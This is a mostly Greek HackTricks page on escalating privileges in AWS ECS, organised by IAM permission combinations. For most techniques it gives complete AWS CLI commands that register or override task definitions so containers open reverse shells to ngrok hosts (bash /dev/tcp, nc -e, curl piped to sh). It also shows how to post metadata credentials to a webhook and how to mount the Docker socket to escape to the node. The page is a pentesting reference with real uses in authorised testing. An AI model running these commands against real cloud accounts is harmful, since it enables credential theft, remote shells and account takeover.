# AWS - ECS Privesc

{{#include ../../../banners/hacktricks-training.md}}

## ECS

Περισσότερες **πληροφορίες για το ECS** στο:

{{#ref}}
../aws-services/aws-ecs-enum.md
{{#endref}}

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:RunTask`

Ένας επιτιθέμενος που καταχράται τα `iam:PassRole`, `ecs:RegisterTaskDefinition` και `ecs:RunTask` δικαιώματα στο ECS μπορεί να **δημιουργήσει ένα νέο task definition** με ένα **κακόβουλο container** που κλέβει τα metadata credentials και να **το τρέξει**.

{{#tabs }}
{{#tab name="Reverse Shell" }}
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--requires-compatibilities "[\"FARGATE\"]" \
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/0.tcp.ngrok.io/14280 0>&1\\\"\"]}]"

# Run task definition
aws ecs run-task --task-definition iam_exfiltration \
--cluster arn:aws:ecs:eu-west-1:947247140022:cluster/API \
--launch-type FARGATE \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"subnet-e282f9b8\"]}}"

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1
```
{{#endtab }}

{{#tab name="Webhook" }}

Δημιούργησε ένα webhook χρησιμοποιώντας έναν ιστότοπο όπως το webhook.site
```bash

# Create file container-definition.json
[
{
"name": "exfil_creds",
"image": "python:latest",
"entryPoint": ["sh", "-c"],
"command": [
"CREDS=$(curl -s http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}); curl -X POST -H 'Content-Type: application/json' -d \"$CREDS\" https://webhook.site/abcdef12-3456-7890-abcd-ef1234567890"
]
}
]

# Run task definition, uploading the .json file
aws ecs register-task-definition \
--family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 \
--memory 512 \
--requires-compatibilities FARGATE \
--container-definitions file://container-definition.json

# Check the webhook for a response

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1

```
{{#endtab }}

{{#endtabs }}

**Πιθανός Αντίκτυπος:** Άμεση privesc σε διαφορετικό ECS role.

### `iam:PassRole`,`ecs:RunTask`
Ένας επιτιθέμενος που έχει `iam:PassRole` και `ecs:RunTask` δικαιώματα μπορεί να ξεκινήσει ένα νέο ECS task με τροποποιημένο **ρόλο εκτέλεσης**, **ρόλο εργασίας** και τις **command** τιμές του container. Η εντολή CLI `ecs run-task` περιέχει την επιλογή `--overrides` που επιτρέπει την αλλαγή κατά την εκτέλεση των `executionRoleArn`, `taskRoleArn` και της `command` του container χωρίς να τροποποιηθεί το task definition.

Οι συγκεκριμένοι IAM ρόλοι για `taskRoleArn` και `executionRoleArn` πρέπει να εμπιστεύονται/επιτρέπουν να αναληφθούν από το `ecs-tasks.amazonaws.com` στην trust policy τους.

Επιπλέον, ο επιτιθέμενος χρειάζεται να γνωρίζει:
- ECS cluster name
- VPC Subnet
- Security group (Αν δεν καθοριστεί security group θα χρησιμοποιηθεί το προεπιλεγμένο)
- Task Definition Name and revision
- Name of the Container
```bash
aws ecs run-task \
--cluster <cluster-name> \
--launch-type FARGATE \
--network-configuration "awsvpcConfiguration={subnets=[<subnet-id>],securityGroups=[<security-group-id>],assignPublicIp=ENABLED}" \
--task-definition <task-definition:revision> \
--overrides '
{
"taskRoleArn": "arn:aws:iam::<redacted>:role/HighPrivilegedECSTaskRole",
"containerOverrides": [
{
"name": <container-name>,
"command": ["nc", "4.tcp.eu.ngrok.io", "18798", "-e", "/bin/bash"]
}
]
}'
```
Στο απόσπασμα κώδικα πιο πάνω, ο attacker αντικαθιστά μόνο την τιμή του `taskRoleArn`. Ωστόσο, ο attacker πρέπει να έχει την άδεια `iam:PassRole` πάνω στο `taskRoleArn` που καθορίζεται στην εντολή και στο `executionRoleArn` που ορίζεται στον ορισμό του task για να πραγματοποιηθεί η επίθεση.

If the IAM role that the attacker can pass has enough privileges to pull to ECR image and start the ECS task (`ecr:BatchCheckLayerAvailability`, `ecr:GetDownloadUrlForLayer`,`ecr:BatchGetImage`,`ecr:GetAuthorizationToken`) then the attacker can specify the same IAM role for both `executionRoleArn` and `taskRoleArn` in the `ecs run-task` command.
```sh
aws ecs run-task --cluster <cluster-name> --launch-type FARGATE --network-configuration "awsvpcConfiguration={subnets=[<subnet-id>],securityGroups=[<security-group-id>],assignPublicIp=ENABLED}" --task-definition <task-definition:revision> --overrides '
{
"taskRoleArn": "arn:aws:iam::<redacted>:role/HighPrivilegedECSTaskRole",
"executionRoleArn":"arn:aws:iam::<redacted>:role/HighPrivilegedECSTaskRole",
"containerOverrides": [
{
"name": "<container-name>",
"command": ["nc", "4.tcp.eu.ngrok.io", "18798", "-e", "/bin/bash"]
}
]
}'
```
**Potential Impact:** Άμεσο privesc σε οποιονδήποτε ECS task role.

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:StartTask`

Όπως στο προηγούμενο παράδειγμα, ένας attacker που εκμεταλλεύεται τα δικαιώματα **`iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:StartTask`** στο ECS μπορεί να **δημιουργήσει ένα νέο task definition** με ένα **κακόβουλο container** που κλέβει τα metadata credentials και να το **τρέξει**.\
Ωστόσο, σε αυτή την περίπτωση, απαιτείται μια container instance για να τρέξει το κακόβουλο task definition.
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/0.tcp.ngrok.io/14280 0>&1\\\"\"]}]"

aws ecs start-task --task-definition iam_exfiltration \
--container-instances <instance_id>

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1
```
**Πιθανός Αντίκτυπος:** Direct privesc to any ECS role.

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, (`ecs:UpdateService|ecs:CreateService)`


Όπως και στο προηγούμενο παράδειγμα, ένας attacker που καταχράται τα **`iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:UpdateService`** ή **`ecs:CreateService`** δικαιώματα στο ECS μπορεί να **δημιουργήσει ένα νέο task definition** με έναν **malicious container** που **κλέβει τα metadata credentials** και **να το τρέξει δημιουργώντας ένα νέο service με τουλάχιστον 1 task σε λειτουργία.**
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn  "$ECS_ROLE_ARN" \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--requires-compatibilities "[\"FARGATE\"]" \
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/8.tcp.ngrok.io/12378 0>&1\\\"\"]}]"

# Run the task creating a service
aws ecs create-service --service-name exfiltration \
--task-definition iam_exfiltration \
--desired-count 1 \
--cluster "$CLUSTER_ARN" \
--launch-type FARGATE \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"$SUBNET\"]}}"

# Run the task updating a service
aws ecs update-service --cluster <CLUSTER NAME> \
--service <SERVICE NAME> \
--task-definition <NEW TASK DEFINITION NAME>
```
**Potential Impact:** Άμεσο privesc σε οποιονδήποτε ECS role.

### `iam:PassRole`, (`ecs:UpdateService|ecs:CreateService)`

Στην πραγματικότητα, μόνο με αυτά τα δικαιώματα είναι δυνατό να χρησιμοποιήσετε overrides για να εκτελέσετε αυθαίρετες εντολές σε ένα container με οποιοδήποτε role, με κάτι σαν:
```bash
aws ecs run-task \
--task-definition "<task-name>" \
--overrides '{"taskRoleArn":"<role-arn>", "containerOverrides":[{"name":"<container-name-in-task>","command":["/bin/bash","-c","curl https://reverse-shell.sh/6.tcp.eu.ngrok.io:18499 | sh"]}]}' \
--cluster <cluster-name> \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"DISABLED\", \"subnets\":[\"<subnet-name>\"]}}"
```
**Potential Impact:** Άμεση privesc σε οποιονδήποτε ρόλο ECS.

### `ecs:RegisterTaskDefinition`, **`(ecs:RunTask|ecs:StartTask|ecs:UpdateService|ecs:CreateService)`**

Αυτό το σενάριο είναι σαν τα προηγούμενα αλλά **χωρίς** την **`iam:PassRole`** άδεια.\
Παραμένει όμως ενδιαφέρον επειδή αν μπορείτε να τρέξετε ένα αυθαίρετο container, ακόμη κι αν είναι χωρίς ρόλο, θα μπορούσατε να **run a privileged container to escape** στον node και να **steal the EC2 IAM role** και τους **other ECS containers roles** που τρέχουν στον node.\
Μπορείτε ακόμη και να **force other tasks to run inside the EC2 instance** που θα συμβιβάσετε, για να κλέψετε τα credentials τους (όπως συζητείται στην [**Privesc to node section**](aws-ecs-post-exploitation.md#privesc-to-node)).

> [!WARNING]
> Αυτή η επίθεση είναι δυνατή μόνο αν το **ECS cluster is using EC2** instances και όχι Fargate.
```bash
printf '[
{
"name":"exfil_creds",
"image":"python:latest",
"entryPoint":["sh", "-c"],
"command":["/bin/bash -c \\\"bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/12976 0>&1\\\""],
"mountPoints": [
{
"readOnly": false,
"containerPath": "/var/run/docker.sock",
"sourceVolume": "docker-socket"
}
]
}
]' > /tmp/task.json

printf '[
{
"name": "docker-socket",
"host": {
"sourcePath": "/var/run/docker.sock"
}
}
]' > /tmp/volumes.json


aws ecs register-task-definition --family iam_exfiltration \
--cpu 256 --memory 512 \
--requires-compatibilities '["EC2"]' \
--container-definitions file:///tmp/task.json \
--volumes file:///tmp/volumes.json


aws ecs run-task --task-definition iam_exfiltration \
--cluster arn:aws:ecs:us-east-1:947247140022:cluster/ecs-takeover-ecs_takeover_cgidc6fgpq6rpg-cluster \
--launch-type EC2

# You will need to do 'apt update' and 'apt install docker.io' to install docker in the rev shell
```
### `ecs:ExecuteCommand`, `ecs:DescribeTasks,`**`(ecs:RunTask|ecs:StartTask|ecs:UpdateService|ecs:CreateService)`**

Ένας attacker με τα **`ecs:ExecuteCommand`, `ecs:DescribeTasks`** μπορεί να **εκτελέσει εντολές** μέσα σε ένα τρέχον container και να εξάγει το IAM role που είναι συνημμένο σε αυτό (χρειάζεστε τα describe permissions γιατί είναι απαραίτητα για να τρέξετε `aws ecs execute-command`).\
Ωστόσο, για να γίνει αυτό, το container instance πρέπει να τρέχει το **ExecuteCommand agent** (το οποίο εξ ορισμού δεν τρέχει).

Therefore, the attacker could try to:

- **Try to run a command** in every running container
```bash
# List enableExecuteCommand on each task
for cluster in $(aws ecs list-clusters | jq .clusterArns | grep '"' | cut -d '"' -f2); do
echo "Cluster $cluster"
for task in $(aws ecs list-tasks --cluster "$cluster" | jq .taskArns | grep '"' | cut -d '"' -f2); do
echo "  Task $task"
# If true, it's your lucky day
aws ecs describe-tasks --cluster "$cluster" --tasks "$task" | grep enableExecuteCommand
done
done

# Execute a shell in a container
aws ecs execute-command --interactive \
--command "sh" \
--cluster "$CLUSTER_ARN" \
--task "$TASK_ARN"
```
- Αν έχει **`ecs:RunTask`**, τρέξτε ένα task με `aws ecs run-task --enable-execute-command [...]`
- Αν έχει **`ecs:StartTask`**, τρέξτε ένα task με `aws ecs start-task --enable-execute-command [...]`
- Αν έχει **`ecs:CreateService`**, δημιουργήστε μια service με `aws ecs create-service --enable-execute-command [...]`
- Αν έχει **`ecs:UpdateService`**, ενημερώστε μια service με `aws ecs update-service --enable-execute-command [...]`

Μπορείτε να βρείτε **παραδείγματα αυτών των επιλογών** στις **προηγούμενες ECS privesc ενότητες**.

**Potential Impact:** Privesc σε διαφορετικό role συνδεδεμένο με containers.

### `ssm:StartSession`

Δείτε στη **ssm privesc page** πώς μπορείτε να καταχραστείτε αυτήν την άδεια για να **privesc to ECS**:

{{#ref}}
aws-ssm-privesc.md
{{#endref}}

### `iam:PassRole`, `ec2:RunInstances`

Δείτε στην **ec2 privesc page** πώς μπορείτε να καταχραστείτε αυτές τις άδειες για να **privesc to ECS**:

{{#ref}}
aws-ec2-privesc.md
{{#endref}}

### `ecs:RegisterContainerInstance`, `ecs:DeregisterContainerInstance`, `ecs:StartTask`, `iam:PassRole`

Ένας επιτιθέμενος με αυτές τις άδειες θα μπορούσε ενδεχομένως να καταχωρήσει ένα EC2 instance σε ένα ECS cluster και να τρέξει tasks πάνω του. Αυτό θα μπορούσε να επιτρέψει στον επιτιθέμενο να εκτελέσει αυθαίρετο κώδικα στο πλαίσιο των ECS tasks.

- TODO: Είναι δυνατόν να καταχωρηθεί ένα instance από διαφορετικό AWS account έτσι ώστε τα tasks να τρέχουν σε μηχανές που ελέγχονται από τον επιτιθέμενο??

### `ecs:CreateTaskSet`, `ecs:UpdateServicePrimaryTaskSet`, `ecs:DescribeTaskSets`

> [!NOTE]
> TODO: Δοκιμάστε αυτό

Ένας επιτιθέμενος με τις άδειες `ecs:CreateTaskSet`, `ecs:UpdateServicePrimaryTaskSet`, και `ecs:DescribeTaskSets` μπορεί να **δημιουργήσει ένα κακόβουλο task set για μια υπάρχουσα ECS service και να ενημερώσει το primary task set**. Αυτό επιτρέπει στον επιτιθέμενο να **εκτελέσει αυθαίρετο κώδικα εντός της υπηρεσίας**.
```bash
# Register a task definition with a reverse shell
echo '{
"family": "malicious-task",
"containerDefinitions": [
{
"name": "malicious-container",
"image": "alpine",
"command": [
"sh",
"-c",
"apk add --update curl && curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | sh"
]
}
]
}' > malicious-task-definition.json

aws ecs register-task-definition --cli-input-json file://malicious-task-definition.json

# Create a malicious task set for the existing service
aws ecs create-task-set --cluster existing-cluster --service existing-service --task-definition malicious-task --network-configuration "awsvpcConfiguration={subnets=[subnet-0e2b3f6c],securityGroups=[sg-0f9a6a76],assignPublicIp=ENABLED}"

# Update the primary task set for the service
aws ecs update-service-primary-task-set --cluster existing-cluster --service existing-service --primary-task-set arn:aws:ecs:region:123456789012:task-set/existing-cluster/existing-service/malicious-task-set-id
```
**Πιθανός Αντίκτυπος**: Execute arbitrary code στην επηρεασμένη υπηρεσία, ενδεχομένως επηρεάζοντας τη λειτουργικότητά της ή exfiltrating sensitive data.

## Αναφορές

- [https://ruse.tech/blogs/ecs-attack-methods](https://ruse.tech/blogs/ecs-attack-methods)

{{#include ../../../banners/hacktricks-training.md}}
